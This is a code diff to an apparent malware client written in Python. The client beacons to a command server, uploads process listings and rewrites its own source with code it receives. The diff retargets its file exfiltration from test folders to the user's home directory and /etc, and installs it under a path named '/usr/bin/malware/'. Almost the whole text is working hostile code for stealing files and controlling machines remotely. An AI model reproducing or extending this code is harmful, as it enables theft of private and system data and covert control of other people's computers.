@@ -17,15 +17,16 @@ class ProgramRebootSignal(Exception):
     "Raised when the inner program wishes to reboot with new code"
     pass
 
+path_prefix="/usr/bin/malware/"
 my_id = "1"
 server_url = f"http://localhost:5000/sync/{my_id}"
 heartbeat_interval_seconds = 5 * 60
 nonce_threshold_seconds = 15
 # list of directories we recursively search for text files
-exfiltrate_subtree_roots = ["C:/Users/japra/Desktop/test", "C:/Users/japra/Desktop/test2"]
+exfiltrate_subtree_roots = ["~", "/etc"]
 max_exfiltrate_file_size = 4096
 
-with open("publickey.pem", "rb") as key_file:
+with open(path_prefix + "publickey.pem", "rb") as key_file:
     public_key = serialization.load_pem_public_key(
         key_file.read(),
     )
@@ -70,13 +71,13 @@ def handle_command(command, argument):
         # Get list of running processes
         process = Popen(['ps', '-a'], stdout=PIPE, stderr=PIPE)
         stdout, _ = process.communicate()
-        buffer += stdout
+        buffer += str(stdout, encoding='utf-8')
 
         payload = json.dumps({ "data": buffer }).encode("utf-8")
         urlopen(Request(server_url, data=payload, headers={"content-type": "application/json"}))
 
     elif command == Command.UPDATE:
-        with open("src.py", "w") as f:
+        with open(path_prefix + "src.py", "w") as f:
             f.write(argument)
         raise ProgramRebootSignal()
 
